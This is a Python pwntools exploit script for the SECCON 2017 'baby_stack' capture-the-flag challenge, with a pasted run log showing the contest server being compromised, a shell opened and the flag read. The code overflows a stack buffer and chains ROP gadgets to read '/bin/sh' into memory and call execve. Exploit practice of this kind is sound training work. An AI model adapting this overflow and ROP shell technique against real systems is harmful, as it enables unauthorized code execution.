'''
root@ubuntu:/mnt/hgfs/shared/seccon/2017/babystack# python solve.py 1
[*] '/mnt/hgfs/shared/seccon/2017/babystack/baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to baby_stack.pwn.seccon.jp on port 15285: Done
[*] Switching to interactive mode
Thank you, HuS\x00\x00\x00\x00\x00\xa0\xae[\x00\x00\x00\x00\x00\xa0\xffY\x00\x00\x00\x00\x00��Y\x00\x00\x00\x00\x00`�Y\x00\x00\x00\x00\x00\xa0\xadY\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xaeY\x00\x00\x00\x00\x00`\xaeY\x00\x00\x00\x00\x00\xa0\xaeY\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xafY\x00\x00\x00\x00\x00`\xafY\x00\x00\x00\x00\x00\xa0\xafY\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00\xa0�Y\x00\x00\x00\x00\x00 \xb0Y\x00\x00\x00\x00\x00`\xb0Y\x00\x00\x00\x00\x00\xa0\xb0Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xb1Y\x00\x00\x00\x00\x00 \xa6Y\x00\x00\x00\x00\x00`\xb1Y\x00\x00\x00\x00\x00\xa0\xb1Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00`\xa6Y\x00\x00\x00\x00\x00\xa0\xa6Y\x00\x00\x00\x00\x00 \xb2Y\x00\x00\x00\x00\x00`\xb2Y\x00\x00\x00\x00\x00\xa0\xb2Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xb3Y\x00\x00\x00\x00\x00 \xa7Y\x00\x00\x00\x00\x00`\xb3Y\x00\x00\x00\x00\x00\xa0\xb3Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00��Y\x00\x00\x00\x00\x00 �Y\x00\x00\x00\x00\x00 \xb4Y\x00\x00\x00\x00\x00`\xb4Y\x00\x00\x00\x00\x00`�Y\x00\x00\x00\x00\x00\xa0\xb4Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xb5Y\x00\x00\x00\x00\x00`\xb5Y\x00\x00\x00\x00\x00\xa0�Y\x00\x00\x00\x00\x00\xa0\xb5Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xb6Y\x00\x00\x00\x00\x00`\xb6Y\x00\x00\x00\x00\x00\xa0\xb6Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xb7Y\x00\x00\x00\x00\x00`\xb7Y\x00\x00\x00\x00\x00\xa0\xb7Y\x00\x00\x00\x00\x00�Y\x00\x00\x00\x00\x00 \xb8Y\x00\x00\x00\x00\x00`\xb8Y\x00\x00\x00\x00\x00��Y\x00\x00\x00\x00\x00\xa0\xb8Y\x00\x00\x00\x00\x00 �Y\x00\x00\x00\x00\x00`�Y\x00\x00\x00\x00\x00\xa0�Y\x00\x00\x00\x00\x00!
msg : \x0f\x05�����H\x8b|\x8bt$\x10\x8bT$\x14\xb8\x00\x00\x00\x0f\x05H=���v\x05\xb8\xff\xff\xff\xff\x89D$\x18����������̋|\xb8\x03\x00\x00\x00\x0f\x05H=���v\x05\xb8\xff\xff\xff\xff\x89D$\x10����H\x8b|H\x8bt$\x10\x8bT$\x18\xb8\x00\x00\x00\x0f\x05H=���v\x05\xb8\xff\xff\xff\xff\x89D$ ����������\x8b|H\x8bt$\x10\x8bT$\x181�\x05H=���v\x05\xb8\xff\xff\xff\xff\x89D$ ��������������H\x83�1ҋD$\x18\xb9@B\x0f\x00��H�\x04$H\x89T1\xff1�1�E1�I\x89�\x00\x00\x00\x0f\x05H\x83���������������̸\xba\x00\x00\x00\x0f\x05\x89D����̸\xba\x00\x00\x00\x0f\x05\x89ǋt\xb8�\x00\x00\x0f\x05������������\xb8'\x00\x00\x00\x0f\x05\x89ǋt\xb8>\x00\x00\x00\x0f\x05������������\x8b|H\x8bt$\x10H\x8bT$\x18\xb8&\x00\x00\x00\x0f\x05�����������H\x8b|H\x8bt$\x10H\x8bT$\x18\xb8\x1b\x00\x00\x00\x0f\x05\x89D$ ������H\x83�H\x8b\x05\x1d9\x16\x00H\x83�t1\xffH\x8d4$\xff�H\x8b\x04$H\x8bTH\x89D$\x18\x89T$ H\x83��H\x8d<$1�H�\xb3v\x13\x00\xff�H\x8b\x04$\x8bTHi��\x03\x00\x00H\x89D$\x18\x89T$ H\x83������H\x83�H\x8b\x05\xbd8\x16\x00H\x83�t(�\x00\x00\x00H\x8d4
$ ls
baby_stack
flag.txt
$ cat flag.txt
SECCON{'un54f3'm0dul3_15_fr13ndly_70_4774ck3r5}
$
'''

from pwn import *
import sys, time

context.binary = "./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8"

if len(sys.argv) == 1:
    p = process(["./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8"])
    pause()

else:
    p = remote("baby_stack.pwn.seccon.jp", "15285")

bss = 0x000000000059f920
syscall = 0x0000000000456889    # syscall; ret;
pop1rax = 0x00000000004016ea    # pop rax; ret;
pop1rsi = 0x000000000046defd    # pop rsi; ret;
pop1rdi = 0x0000000000470931    # pop rdi; or byte ptr [rax + 0x39], cl; ret;
pop1rdx = 0x00000000004a247c    # pop rdx; or byte ptr [rax - 0x77], cl; ret;


p.recvuntil("name >> ")
p.sendline("A" * 0x100)
p.recvuntil("message >> ")
exp = "B" * 104 + p64(0x0000000000599940) + p64(0x200) + "D" * 8
exp += "a" * 0x48 + p64(syscall) + p64(0x200)
exp += "b" * (0x80 + 0x40)
exp += p64(pop1rax) + p64(bss)
exp += p64(pop1rdi) + p64(0)
exp += p64(pop1rsi) + p64(bss + 0x200)
exp += p64(pop1rdx) + p64(0x100)
exp += p64(pop1rax) + p64(0)        # read
exp += p64(syscall)

exp += p64(pop1rax) + p64(bss)
exp += p64(pop1rdi) + p64(bss + 0x200)
exp += p64(pop1rsi) + p64(0)
exp += p64(pop1rdx) + p64(0)
exp += p64(pop1rax) + p64(59)
exp += p64(syscall)
p.sendline(exp)
p.sendline("/bin/sh\x00")

'''
p.recvuntil("msg : ")
for i in xrange(50):
    leak = u64(p.recv(8))
    log.info("leak : " + hex(leak))
'''
p.interactive()
